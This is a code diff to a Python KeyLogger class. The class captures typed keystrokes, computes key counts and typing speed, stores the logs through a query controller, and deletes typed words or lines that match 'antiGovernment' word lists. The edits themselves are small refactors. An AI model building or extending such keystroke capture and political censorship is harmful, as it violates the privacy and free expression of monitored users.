@@ -5,7 +5,7 @@ from difflib import SequenceMatcher
 
 SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';', ':', '_', '`', '*', '\'']
 
-def containes(line: str, sub: str):
+def contains(line: str, sub: str):
     try:
         index = line.index(sub)
         return True
@@ -48,6 +48,7 @@ class KeyLogger():
         self.censorWords = antiGovernmentWords
         self.censorSentences = antiGovernmentSentences
         self.logged = []
+        self.keyEvaluation = {}
 
     def correctWord(self, wrongWord: str, correctWord: str):
         self.deleteWord(wrongWord)
@@ -73,16 +74,15 @@ class KeyLogger():
                 self.deleteLine(line)
 
     def evaluateKeyUsage(self, stringList: List[str]):
-        keyEvaluation = {}
         for str in stringList:
             for c in str:
                 count = str.count(c)
-                if c not in keyEvaluation:
-                    keyEvaluation[c] = count
+                if c not in self.keyEvaluation:
+                    self.keyEvaluation[c] = count
                 else:
-                    oldCount = keyEvaluation[c]
-                    keyEvaluation[c] = oldCount + count
-        return keyEvaluation
+                    oldCount = self.keyEvaluation[c]
+                    self.keyEvaluation[c] = oldCount + count
+        return self.keyEvaluation
 
     def deleteWord(self, word: str):
         length = len(word)
@@ -129,12 +129,11 @@ class KeyLogger():
             typedStrings = keyboard.get_typed_strings(keyEvents)
             for line in typedStrings:
                 lines.append(line)
-                if containes(line, "konami"):
+                if contains(line, "konami"):
                     return
             self.censorOutput(lines[0])
             keyEvaluation = self.evaluateKeyUsage(lines)
-            print(keyEvaluation)
-            print(wpm(lines, recordingEnd, recordingStart))
+            WPM = wpm(lines, recordingEnd, recordingStart)
             yield lines[0]
     
     def main(self):
@@ -142,9 +141,9 @@ class KeyLogger():
         log = []
         counter = 0
         for i in input:
-            log.append(i)
+            if len(i) > 0:
+                log.append(i)
             if counter % 5 == 0:
-                print(log)
                 self.queryController.addToKeyLogs(log)
                 counter = 0
                 log.clear()
